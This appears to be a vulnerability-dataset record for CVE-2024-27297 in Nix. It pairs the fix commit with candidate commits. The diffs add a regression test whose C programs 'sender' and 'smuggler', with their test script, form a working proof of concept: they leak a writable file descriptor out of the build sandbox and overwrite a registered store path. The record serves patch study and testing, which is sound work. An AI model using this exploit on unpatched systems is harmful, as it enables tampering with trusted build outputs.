{
  "cve_id": "CVE-2024-27297",
  "cve_desc": "Nix is a package manager for Linux and other Unix systems. A fixed-output derivations on Linux can send file descriptors to files in the Nix store to another program running on the host (or another fixed-output derivation) via Unix domain sockets in the abstract namespace. This allows to modify the output of the derivation, after Nix has registered the path as \"valid\" and immutable in the Nix database. In particular, this allows the output of fixed-output derivations to be modified from their expected content. This issue has been addressed in versions 2.3.18 2.18.2 2.19.4 and 2.20.5. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
  "repo": "NixOS/nix",
  "patch_hash": "f8170ce9f119e5e6724eb81ff1b5a2d4c0024000",
  "patch_info": {
    "commit_hash": "f8170ce9f119e5e6724eb81ff1b5a2d4c0024000",
    "repo": "NixOS/nix",
    "commit_url": "https://github.com/NixOS/nix/commit/f8170ce9f119e5e6724eb81ff1b5a2d4c0024000",
    "files": [
      "doc/manual/rl-next/fod-sandbox-escape.md",
      "src/libstore/build/local-derivation-goal.cc",
      "src/libutil/file-system.cc",
      "src/libutil/file-system.hh",
      "tests/nixos/ca-fd-leak/default.nix",
      "tests/nixos/ca-fd-leak/sender.c",
      "tests/nixos/ca-fd-leak/smuggler.c",
      "tests/nixos/default.nix"
    ],
    "message": "Merge pull request from GHSA-2ffj-w4mj-pg37\n\nSandbox escape 2.20",
    "before_after_code_files": [
      "src/libstore/build/local-derivation-goal.cc||src/libstore/build/local-derivation-goal.cc",
      "src/libutil/file-system.cc||src/libutil/file-system.cc",
      "src/libutil/file-system.hh||src/libutil/file-system.hh",
      "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix",
      "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c",
      "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c",
      "tests/nixos/default.nix||tests/nixos/default.nix"
    ]
  },
  "patch_diff": {
    "src/libstore/build/local-derivation-goal.cc||src/libstore/build/local-derivation-goal.cc": [
      "File: src/libstore/build/local-derivation-goal.cc -> src/libstore/build/local-derivation-goal.cc",
      "--- Hunk 1 ---",
      "[Context before]",
      "2527:             [&](const DerivationOutput::CAFixed & dof) {",
      "2528:                 auto & wanted = dof.ca.hash;",
      "2530:                 auto newInfo0 = newInfoFromCA(DerivationOutput::CAFloating {",
      "2531:                     .method = dof.ca.method,",
      "2532:                     .hashAlgo = wanted.algo,",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "2532:                 Path tmpOutput = actualPath + \".tmp\";",
      "2533:                 copyFile(actualPath, tmpOutput, true);",
      "2534:                 renameFile(tmpOutput, actualPath);",
      "",
      "---------------"
    ],
    "src/libutil/file-system.cc||src/libutil/file-system.cc": [
      "File: src/libutil/file-system.cc -> src/libutil/file-system.cc",
      "--- Hunk 1 ---",
      "[Context before]",
      "628:     }",
      "629: }",
      "631: void renameFile(const Path & oldName, const Path & newName)",
      "632: {",
      "633:     fs::rename(oldName, newName);",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "631: void copyFile(const Path & oldPath, const Path & newPath, bool andDelete)",
      "632: {",
      "633:     return copy(fs::directory_entry(fs::path(oldPath)), fs::path(newPath), andDelete);",
      "634: }",
      "",
      "---------------"
    ],
    "src/libutil/file-system.hh||src/libutil/file-system.hh": [
      "File: src/libutil/file-system.hh -> src/libutil/file-system.hh",
      "--- Hunk 1 ---",
      "[Context before]",
      "187: void moveFile(const Path & src, const Path & dst);",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "195: void copyFile(const Path & oldPath, const Path & newPath, bool andDelete);",
      "",
      "---------------"
    ],
    "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix": [
      "File: tests/nixos/ca-fd-leak/default.nix -> tests/nixos/ca-fd-leak/default.nix",
      "--- Hunk 1 ---",
      "[Context before]",
      "[No context available]",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "1: # Nix is a sandboxed build system. But Not everything can be handled inside its",
      "2: # sandbox: Network access is normally blocked off, but to download sources, a",
      "3: # trapdoor has to exist. Nix handles this by having \"Fixed-output derivations\".",
      "4: # The detail here is not important, but in our case it means that the hash of",
      "5: # the output has to be known beforehand. And if you know that, you get a few",
      "6: # rights: you no longer run inside a special network namespace!",
      "7: #",
      "8: # Now, Linux has a special feature, that not many other unices do: Abstract",
      "9: # unix domain sockets! Not only that, but those are namespaced using the",
      "10: # network namespace! That means that we have a way to create sockets that are",
      "11: # available in every single fixed-output derivation, and also all processes",
      "12: # running on the host machine! Now, this wouldn't be that much of an issue, as,",
      "13: # well, the whole idea is that the output is pure, and all processes in the",
      "14: # sandbox are killed before finalizing the output. What if we didn't need those",
      "15: # processes at all? Unix domain sockets have a semi-known trick: you can pass",
      "16: # file descriptors around!",
      "17: # This makes it possible to exfiltrate a file-descriptor with write access to",
      "18: # $out outside of the sandbox. And that file-descriptor can be used to modify",
      "19: # the contents of the store path after it has been registered.",
      "21: { config, ... }:",
      "23: let",
      "24:   pkgs = config.nodes.machine.nixpkgs.pkgs;",
      "26:   # Simple C program that sends a a file descriptor to `$out` to a Unix",
      "27:   # domain socket.",
      "28:   # Compiled statically so that we can easily send it to the VM and use it",
      "29:   # inside the build sandbox.",
      "30:   sender = pkgs.runCommandWith {",
      "31:     name = \"sender\";",
      "32:     stdenv = pkgs.pkgsStatic.stdenv;",
      "33:   } ''",
      "34:     $CC -static -o $out ${./sender.c}",
      "35:   '';",
      "37:   # Okay, so we have a file descriptor shipped out of the FOD now. But the",
      "38:   # Nix store is read-only, right? .. Well, yeah. But this file descriptor",
      "39:   # lives in a mount namespace where it is not! So even when this file exists",
      "40:   # in the actual Nix store, we're capable of just modifying its contents...",
      "41:   smuggler = pkgs.writeCBin \"smuggler\" (builtins.readFile ./smuggler.c);",
      "43:   # The abstract socket path used to exfiltrate the file descriptor",
      "44:   socketName = \"FODSandboxExfiltrationSocket\";",
      "45: in",
      "46: {",
      "47:   name = \"ca-fd-leak\";",
      "49:   nodes.machine =",
      "50:     { config, lib, pkgs, ... }:",
      "51:     { virtualisation.writableStore = true;",
      "52:       nix.settings.substituters = lib.mkForce [ ];",
      "53:       virtualisation.additionalPaths = [ pkgs.busybox-sandbox-shell sender smuggler pkgs.socat ];",
      "54:     };",
      "56:   testScript = { nodes }: ''",
      "57:     start_all()",
      "59:     machine.succeed(\"echo hello\")",
      "60:     # Start the smuggler server",
      "61:     machine.succeed(\"${smuggler}/bin/smuggler ${socketName} >&2 &\")",
      "63:     # Build the smuggled derivation.",
      "64:     # This will connect to the smuggler server and send it the file descriptor",
      "65:     machine.succeed(r\"\"\"",
      "66:       nix-build -E '",
      "67:         builtins.derivation {",
      "68:           name = \"smuggled\";",
      "69:           system = builtins.currentSystem;",
      "70:           # look ma, no tricks!",
      "71:           outputHashMode = \"flat\";",
      "72:           outputHashAlgo = \"sha256\";",
      "73:           outputHash = builtins.hashString \"sha256\" \"hello, world\\n\";",
      "74:           builder = \"${pkgs.busybox-sandbox-shell}/bin/sh\";",
      "75:           args = [ \"-c\" \"echo \\\"hello, world\\\" > $out; ''${${sender}} ${socketName}\" ];",
      "76:       }'",
      "77:     \"\"\".strip())",
      "80:     # Tell the smuggler server that we're done",
      "81:     machine.execute(\"echo done | ${pkgs.socat}/bin/socat - ABSTRACT-CONNECT:${socketName}\")",
      "83:     # Check that the file was not modified",
      "84:     machine.succeed(r\"\"\"",
      "85:       cat ./result",
      "86:       test \"$(cat ./result)\" = \"hello, world\"",
      "87:     \"\"\".strip())",
      "88:   '';",
      "90: }",
      "",
      "---------------"
    ],
    "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c": [
      "File: tests/nixos/ca-fd-leak/sender.c -> tests/nixos/ca-fd-leak/sender.c",
      "--- Hunk 1 ---",
      "[Context before]",
      "[No context available]",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "1: #include <sys/socket.h>",
      "2: #include <sys/un.h>",
      "3: #include <stdlib.h>",
      "4: #include <stddef.h>",
      "5: #include <stdio.h>",
      "6: #include <unistd.h>",
      "7: #include <fcntl.h>",
      "8: #include <errno.h>",
      "9: #include <string.h>",
      "10: #include <assert.h>",
      "12: int main(int argc, char **argv) {",
      "14:     assert(argc == 2);",
      "16:     int sock = socket(AF_UNIX, SOCK_STREAM, 0);",
      "19:     struct sockaddr_un data;",
      "20:     data.sun_family = AF_UNIX;",
      "21:     data.sun_path[0] = 0;",
      "22:     strcpy(data.sun_path + 1, argv[1]);",
      "26:     int res = -1;",
      "27:     while (res < 0) {",
      "28:         res = connect(sock, (const struct sockaddr *)&data,",
      "29:             offsetof(struct sockaddr_un, sun_path)",
      "30:               + strlen(argv[1])",
      "31:               + 1);",
      "32:         if (res < 0 && errno != ECONNREFUSED) perror(\"connect\");",
      "33:         if (errno != ECONNREFUSED) break;",
      "34:     }",
      "37:     struct msghdr msg = {0};",
      "38:     msg.msg_control = malloc(128);",
      "39:     msg.msg_controllen = 128;",
      "42:     struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);",
      "43:     hdr->cmsg_len = CMSG_LEN(sizeof(int));",
      "44:     hdr->cmsg_level = SOL_SOCKET;",
      "45:     hdr->cmsg_type = SCM_RIGHTS;",
      "46:     int fd = open(getenv(\"out\"), O_RDWR | O_CREAT, 0640);",
      "47:     memcpy(CMSG_DATA(hdr), (void *)&fd, sizeof(int));",
      "49:     msg.msg_controllen = CMSG_SPACE(sizeof(int));",
      "52:     msg.msg_iov = malloc(sizeof(struct iovec));",
      "53:     msg.msg_iov[0].iov_base = \"\";",
      "54:     msg.msg_iov[0].iov_len = 1;",
      "55:     msg.msg_iovlen = 1;",
      "58:     res = sendmsg(sock, &msg, 0);",
      "59:     if (res < 0) perror(\"sendmsg\");",
      "60:     int buf;",
      "64:     recv(sock, (void *)&buf, sizeof(int), 0);",
      "65: }",
      "",
      "---------------"
    ],
    "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c": [
      "File: tests/nixos/ca-fd-leak/smuggler.c -> tests/nixos/ca-fd-leak/smuggler.c",
      "--- Hunk 1 ---",
      "[Context before]",
      "[No context available]",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "1: #include <sys/socket.h>",
      "2: #include <sys/un.h>",
      "3: #include <stdlib.h>",
      "4: #include <stddef.h>",
      "5: #include <stdio.h>",
      "6: #include <unistd.h>",
      "7: #include <assert.h>",
      "9: int main(int argc, char **argv) {",
      "11:     assert(argc == 2);",
      "13:     int sock = socket(AF_UNIX, SOCK_STREAM, 0);",
      "16:     struct sockaddr_un data;",
      "17:     data.sun_family = AF_UNIX;",
      "18:     data.sun_path[0] = 0;",
      "19:     strcpy(data.sun_path + 1, argv[1]);",
      "20:     int res = bind(sock, (const struct sockaddr *)&data,",
      "21:         offsetof(struct sockaddr_un, sun_path)",
      "22:         + strlen(argv[1])",
      "23:         + 1);",
      "24:     if (res < 0) perror(\"bind\");",
      "26:     res = listen(sock, 1);",
      "27:     if (res < 0) perror(\"listen\");",
      "29:     int smuggling_fd = -1;",
      "32:     fprintf(stderr, \"%s\\n\", \"Waiting for the first connection\");",
      "33:     int a = accept(sock, 0, 0);",
      "34:     if (a < 0) perror(\"accept\");",
      "36:     struct msghdr msg = {0};",
      "37:     msg.msg_control = malloc(128);",
      "38:     msg.msg_controllen = 128;",
      "41:     recvmsg(a, &msg, 0);",
      "43:     struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);",
      "44:     while (hdr) {",
      "45:         if (hdr->cmsg_level == SOL_SOCKET",
      "46:           && hdr->cmsg_type == SCM_RIGHTS) {",
      "49:             memcpy((void *)&smuggling_fd, CMSG_DATA(hdr), sizeof(int));",
      "50:         }",
      "52:         hdr = CMSG_NXTHDR(&msg, hdr);",
      "53:     }",
      "54:     fprintf(stderr, \"%s\\n\", \"Got the file descriptor. Now waiting for the second connection\");",
      "55:     close(a);",
      "59:     a = accept(sock, 0, 0);",
      "60:     fprintf(stderr, \"%s\\n\", \"Got a second connection, rewriting the file\");",
      "62:     if (ftruncate(smuggling_fd, 0)) perror(\"ftruncate\");",
      "63:     char * new_content = \"Pwned\\n\";",
      "64:     int written_bytes = write(smuggling_fd, new_content, strlen(new_content));",
      "65:     if (written_bytes != strlen(new_content)) perror(\"write\");",
      "66: }",
      "",
      "---------------"
    ],
    "tests/nixos/default.nix||tests/nixos/default.nix": [
      "File: tests/nixos/default.nix -> tests/nixos/default.nix",
      "--- Hunk 1 ---",
      "[Context before]",
      "156:     (system: runNixOSTestFor system ./setuid.nix);",
      "158:   fetch-git = runNixOSTestFor \"x86_64-linux\" ./fetch-git;",
      "159: }",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "160:   ca-fd-leak = runNixOSTestFor \"x86_64-linux\" ./ca-fd-leak;",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "3e992570534a9794780353e5ad4f4949670f82de",
      "candidate_info": {
        "commit_hash": "3e992570534a9794780353e5ad4f4949670f82de",
        "repo": "NixOS/nix",
        "commit_url": "https://github.com/NixOS/nix/commit/3e992570534a9794780353e5ad4f4949670f82de",
        "files": [
          "flake.nix",
          "src/libstore/build/local-derivation-goal.cc",
          "src/libutil/filesystem.cc",
          "src/libutil/util.hh",
          "tests/nixos/ca-fd-leak/default.nix",
          "tests/nixos/ca-fd-leak/sender.c",
          "tests/nixos/ca-fd-leak/smuggler.c"
        ],
        "message": "Manual backport of f8170ce9f119e5e6724eb81ff1b5a2d4c0024000 to fix CVE-2024-27297",
        "before_after_code_files": [
          "flake.nix||flake.nix",
          "src/libstore/build/local-derivation-goal.cc||src/libstore/build/local-derivation-goal.cc",
          "src/libutil/filesystem.cc||src/libutil/filesystem.cc",
          "src/libutil/util.hh||src/libutil/util.hh",
          "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix",
          "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c",
          "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_olp_changes": 1,
        "olp_code_files": {
          "patch": [
            "src/libstore/build/local-derivation-goal.cc||src/libstore/build/local-derivation-goal.cc",
            "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix",
            "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c",
            "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c"
          ],
          "candidate": [
            "src/libstore/build/local-derivation-goal.cc||src/libstore/build/local-derivation-goal.cc",
            "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix",
            "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c",
            "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c"
          ]
        }
      },
      "candidate_diff": {
        "flake.nix||flake.nix": [
          "File: flake.nix -> flake.nix",
          "--- Hunk 1 ---",
          "[Context before]",
          "598:           [\"i686-linux\" \"x86_64-linux\"]",
          "599:           (system: runNixOSTestFor system ./tests/nixos/setuid.nix);",
          "602:         # Make sure that nix-env still produces the exact same result",
          "603:         # on a particular version of Nixpkgs.",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "601:         tests.ca-fd-leak = runNixOSTestFor \"x86_64-linux\" ./tests/nixos/ca-fd-leak;",
          "",
          "---------------"
        ],
        "src/libstore/build/local-derivation-goal.cc||src/libstore/build/local-derivation-goal.cc": [
          "File: src/libstore/build/local-derivation-goal.cc -> src/libstore/build/local-derivation-goal.cc",
          "--- Hunk 1 ---",
          "[Context before]",
          "2544:             [&](const DerivationOutput::CAFixed & dof) {",
          "2545:                 auto & wanted = dof.ca.hash;",
          "2547:                 auto newInfo0 = newInfoFromCA(DerivationOutput::CAFloating {",
          "2548:                     .method = dof.ca.method,",
          "2549:                     .hashType = wanted.type,",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "2549:                 Path tmpOutput = actualPath + \".tmp\";",
          "2550:                 copyFile(actualPath, tmpOutput, true);",
          "2551:                 renameFile(tmpOutput, actualPath);",
          "",
          "---------------"
        ],
        "src/libutil/filesystem.cc||src/libutil/filesystem.cc": [
          "File: src/libutil/filesystem.cc -> src/libutil/filesystem.cc",
          "--- Hunk 1 ---",
          "[Context before]",
          "133:     }",
          "134: }",
          "136: void renameFile(const Path & oldName, const Path & newName)",
          "137: {",
          "138:     fs::rename(oldName, newName);",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "136: void copyFile(const Path & oldPath, const Path & newPath, bool andDelete)",
          "137: {",
          "138:     return copy(fs::directory_entry(fs::path(oldPath)), fs::path(newPath), andDelete);",
          "139: }",
          "",
          "---------------"
        ],
        "src/libutil/util.hh||src/libutil/util.hh": [
          "File: src/libutil/util.hh -> src/libutil/util.hh",
          "--- Hunk 1 ---",
          "[Context before]",
          "275: void moveFile(const Path & src, const Path & dst);",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "283: void copyFile(const Path & oldPath, const Path & newPath, bool andDelete);",
          "",
          "---------------"
        ],
        "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix": [
          "File: tests/nixos/ca-fd-leak/default.nix -> tests/nixos/ca-fd-leak/default.nix",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: # Nix is a sandboxed build system. But Not everything can be handled inside its",
          "2: # sandbox: Network access is normally blocked off, but to download sources, a",
          "3: # trapdoor has to exist. Nix handles this by having \"Fixed-output derivations\".",
          "4: # The detail here is not important, but in our case it means that the hash of",
          "5: # the output has to be known beforehand. And if you know that, you get a few",
          "6: # rights: you no longer run inside a special network namespace!",
          "7: #",
          "8: # Now, Linux has a special feature, that not many other unices do: Abstract",
          "9: # unix domain sockets! Not only that, but those are namespaced using the",
          "10: # network namespace! That means that we have a way to create sockets that are",
          "11: # available in every single fixed-output derivation, and also all processes",
          "12: # running on the host machine! Now, this wouldn't be that much of an issue, as,",
          "13: # well, the whole idea is that the output is pure, and all processes in the",
          "14: # sandbox are killed before finalizing the output. What if we didn't need those",
          "15: # processes at all? Unix domain sockets have a semi-known trick: you can pass",
          "16: # file descriptors around!",
          "17: # This makes it possible to exfiltrate a file-descriptor with write access to",
          "18: # $out outside of the sandbox. And that file-descriptor can be used to modify",
          "19: # the contents of the store path after it has been registered.",
          "21: { config, ... }:",
          "23: let",
          "24:   pkgs = config.nodes.machine.nixpkgs.pkgs;",
          "26:   # Simple C program that sends a a file descriptor to `$out` to a Unix",
          "27:   # domain socket.",
          "28:   # Compiled statically so that we can easily send it to the VM and use it",
          "29:   # inside the build sandbox.",
          "30:   sender = pkgs.runCommandWith {",
          "31:     name = \"sender\";",
          "32:     stdenv = pkgs.pkgsStatic.stdenv;",
          "33:   } ''",
          "34:     $CC -static -o $out ${./sender.c}",
          "35:   '';",
          "37:   # Okay, so we have a file descriptor shipped out of the FOD now. But the",
          "38:   # Nix store is read-only, right? .. Well, yeah. But this file descriptor",
          "39:   # lives in a mount namespace where it is not! So even when this file exists",
          "40:   # in the actual Nix store, we're capable of just modifying its contents...",
          "41:   smuggler = pkgs.writeCBin \"smuggler\" (builtins.readFile ./smuggler.c);",
          "43:   # The abstract socket path used to exfiltrate the file descriptor",
          "44:   socketName = \"FODSandboxExfiltrationSocket\";",
          "45: in",
          "46: {",
          "47:   name = \"ca-fd-leak\";",
          "49:   nodes.machine =",
          "50:     { config, lib, pkgs, ... }:",
          "51:     { virtualisation.writableStore = true;",
          "52:       nix.settings.substituters = lib.mkForce [ ];",
          "53:       virtualisation.additionalPaths = [ pkgs.busybox-sandbox-shell sender smuggler pkgs.socat ];",
          "54:     };",
          "56:   testScript = { nodes }: ''",
          "57:     start_all()",
          "59:     machine.succeed(\"echo hello\")",
          "60:     # Start the smuggler server",
          "61:     machine.succeed(\"${smuggler}/bin/smuggler ${socketName} >&2 &\")",
          "63:     # Build the smuggled derivation.",
          "64:     # This will connect to the smuggler server and send it the file descriptor",
          "65:     machine.succeed(r\"\"\"",
          "66:       nix-build -E '",
          "67:         builtins.derivation {",
          "68:           name = \"smuggled\";",
          "69:           system = builtins.currentSystem;",
          "70:           # look ma, no tricks!",
          "71:           outputHashMode = \"flat\";",
          "72:           outputHashAlgo = \"sha256\";",
          "73:           outputHash = builtins.hashString \"sha256\" \"hello, world\\n\";",
          "74:           builder = \"${pkgs.busybox-sandbox-shell}/bin/sh\";",
          "75:           args = [ \"-c\" \"echo \\\"hello, world\\\" > $out; ''${${sender}} ${socketName}\" ];",
          "76:       }'",
          "77:     \"\"\".strip())",
          "80:     # Tell the smuggler server that we're done",
          "81:     machine.execute(\"echo done | ${pkgs.socat}/bin/socat - ABSTRACT-CONNECT:${socketName}\")",
          "83:     # Check that the file was not modified",
          "84:     machine.succeed(r\"\"\"",
          "85:       cat ./result",
          "86:       test \"$(cat ./result)\" = \"hello, world\"",
          "87:     \"\"\".strip())",
          "88:   '';",
          "90: }",
          "",
          "---------------"
        ],
        "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c": [
          "File: tests/nixos/ca-fd-leak/sender.c -> tests/nixos/ca-fd-leak/sender.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: #include <sys/socket.h>",
          "2: #include <sys/un.h>",
          "3: #include <stdlib.h>",
          "4: #include <stddef.h>",
          "5: #include <stdio.h>",
          "6: #include <unistd.h>",
          "7: #include <fcntl.h>",
          "8: #include <errno.h>",
          "9: #include <string.h>",
          "10: #include <assert.h>",
          "12: int main(int argc, char **argv) {",
          "14:     assert(argc == 2);",
          "16:     int sock = socket(AF_UNIX, SOCK_STREAM, 0);",
          "19:     struct sockaddr_un data;",
          "20:     data.sun_family = AF_UNIX;",
          "21:     data.sun_path[0] = 0;",
          "22:     strcpy(data.sun_path + 1, argv[1]);",
          "26:     int res = -1;",
          "27:     while (res < 0) {",
          "28:         res = connect(sock, (const struct sockaddr *)&data,",
          "29:             offsetof(struct sockaddr_un, sun_path)",
          "30:               + strlen(argv[1])",
          "31:               + 1);",
          "32:         if (res < 0 && errno != ECONNREFUSED) perror(\"connect\");",
          "33:         if (errno != ECONNREFUSED) break;",
          "34:     }",
          "37:     struct msghdr msg = {0};",
          "38:     msg.msg_control = malloc(128);",
          "39:     msg.msg_controllen = 128;",
          "42:     struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);",
          "43:     hdr->cmsg_len = CMSG_LEN(sizeof(int));",
          "44:     hdr->cmsg_level = SOL_SOCKET;",
          "45:     hdr->cmsg_type = SCM_RIGHTS;",
          "46:     int fd = open(getenv(\"out\"), O_RDWR | O_CREAT, 0640);",
          "47:     memcpy(CMSG_DATA(hdr), (void *)&fd, sizeof(int));",
          "49:     msg.msg_controllen = CMSG_SPACE(sizeof(int));",
          "52:     msg.msg_iov = malloc(sizeof(struct iovec));",
          "53:     msg.msg_iov[0].iov_base = \"\";",
          "54:     msg.msg_iov[0].iov_len = 1;",
          "55:     msg.msg_iovlen = 1;",
          "58:     res = sendmsg(sock, &msg, 0);",
          "59:     if (res < 0) perror(\"sendmsg\");",
          "60:     int buf;",
          "64:     recv(sock, (void *)&buf, sizeof(int), 0);",
          "65: }",
          "",
          "---------------"
        ],
        "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c": [
          "File: tests/nixos/ca-fd-leak/smuggler.c -> tests/nixos/ca-fd-leak/smuggler.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: #include <sys/socket.h>",
          "2: #include <sys/un.h>",
          "3: #include <stdlib.h>",
          "4: #include <stddef.h>",
          "5: #include <stdio.h>",
          "6: #include <unistd.h>",
          "7: #include <assert.h>",
          "9: int main(int argc, char **argv) {",
          "11:     assert(argc == 2);",
          "13:     int sock = socket(AF_UNIX, SOCK_STREAM, 0);",
          "16:     struct sockaddr_un data;",
          "17:     data.sun_family = AF_UNIX;",
          "18:     data.sun_path[0] = 0;",
          "19:     strcpy(data.sun_path + 1, argv[1]);",
          "20:     int res = bind(sock, (const struct sockaddr *)&data,",
          "21:         offsetof(struct sockaddr_un, sun_path)",
          "22:         + strlen(argv[1])",
          "23:         + 1);",
          "24:     if (res < 0) perror(\"bind\");",
          "26:     res = listen(sock, 1);",
          "27:     if (res < 0) perror(\"listen\");",
          "29:     int smuggling_fd = -1;",
          "32:     fprintf(stderr, \"%s\\n\", \"Waiting for the first connection\");",
          "33:     int a = accept(sock, 0, 0);",
          "34:     if (a < 0) perror(\"accept\");",
          "36:     struct msghdr msg = {0};",
          "37:     msg.msg_control = malloc(128);",
          "38:     msg.msg_controllen = 128;",
          "41:     recvmsg(a, &msg, 0);",
          "43:     struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);",
          "44:     while (hdr) {",
          "45:         if (hdr->cmsg_level == SOL_SOCKET",
          "46:           && hdr->cmsg_type == SCM_RIGHTS) {",
          "49:             memcpy((void *)&smuggling_fd, CMSG_DATA(hdr), sizeof(int));",
          "50:         }",
          "52:         hdr = CMSG_NXTHDR(&msg, hdr);",
          "53:     }",
          "54:     fprintf(stderr, \"%s\\n\", \"Got the file descriptor. Now waiting for the second connection\");",
          "55:     close(a);",
          "59:     a = accept(sock, 0, 0);",
          "60:     fprintf(stderr, \"%s\\n\", \"Got a second connection, rewriting the file\");",
          "62:     if (ftruncate(smuggling_fd, 0)) perror(\"ftruncate\");",
          "63:     char * new_content = \"Pwned\\n\";",
          "64:     int written_bytes = write(smuggling_fd, new_content, strlen(new_content));",
          "65:     if (written_bytes != strlen(new_content)) perror(\"write\");",
          "66: }",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "f8d20e91a45f71b60402f5916d2475751c089c84",
      "candidate_info": {
        "commit_hash": "f8d20e91a45f71b60402f5916d2475751c089c84",
        "repo": "NixOS/nix",
        "commit_url": "https://github.com/NixOS/nix/commit/f8d20e91a45f71b60402f5916d2475751c089c84",
        "files": [
          "flake.nix",
          "tests/nixos/ca-fd-leak/default.nix",
          "tests/nixos/ca-fd-leak/sender.c",
          "tests/nixos/ca-fd-leak/smuggler.c"
        ],
        "message": "Add a NixOS test for the sandbox escape\n\nTest that we can't leverage abstract unix domain sockets to leak file\ndescriptors out of the sandbox and modify the path after it has been\nregistered.\n\nCo-authored-by: Theophane Hufschmitt <theophane.hufschmitt@tweag.io>",
        "before_after_code_files": [
          "flake.nix||flake.nix",
          "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix",
          "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c",
          "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 1,
        "diff_branch_olp_changes": 1,
        "olp_code_files": {
          "patch": [
            "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix",
            "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c",
            "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c"
          ],
          "candidate": [
            "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix",
            "tests/nixos/ca-fd-leak/sender.c||tests/nixos/ca-fd-leak/sender.c",
            "tests/nixos/ca-fd-leak/smuggler.c||tests/nixos/ca-fd-leak/smuggler.c"
          ]
        }
      },
      "candidate_diff": {
        "flake.nix||flake.nix": [
          "File: flake.nix -> flake.nix",
          "--- Hunk 1 ---",
          "[Context before]",
          "634:           [\"i686-linux\" \"x86_64-linux\"]",
          "635:           (system: runNixOSTestFor system ./tests/nixos/setuid.nix);",
          "638:         # Make sure that nix-env still produces the exact same result",
          "639:         # on a particular version of Nixpkgs.",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "637:         tests.ca-fd-leak = runNixOSTestFor \"x86_64-linux\" ./tests/nixos/ca-fd-leak;",
          "",
          "---------------"
        ],
        "tests/nixos/ca-fd-leak/default.nix||tests/nixos/ca-fd-leak/default.nix": [
          "File: tests/nixos/ca-fd-leak/default.nix -> tests/nixos/ca-fd-leak/default.nix",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: # Nix is a sandboxed build system. But Not everything can be handled inside its",
          "2: # sandbox: Network access is normally blocked off, but to download sources, a",
          "3: # trapdoor has to exist. Nix handles this by having \"Fixed-output derivations\".",
          "4: # The detail here is not important, but in our case it means that the hash of",
          "5: # the output has to be known beforehand. And if you know that, you get a few",
          "6: # rights: you no longer run inside a special network namespace!",
          "7: #",
          "8: # Now, Linux has a special feature, that not many other unices do: Abstract",
          "9: # unix domain sockets! Not only that, but those are namespaced using the",
          "10: # network namespace! That means that we have a way to create sockets that are",
          "11: # available in every single fixed-output derivation, and also all processes",
          "12: # running on the host machine! Now, this wouldn't be that much of an issue, as,",
          "13: # well, the whole idea is that the output is pure, and all processes in the",
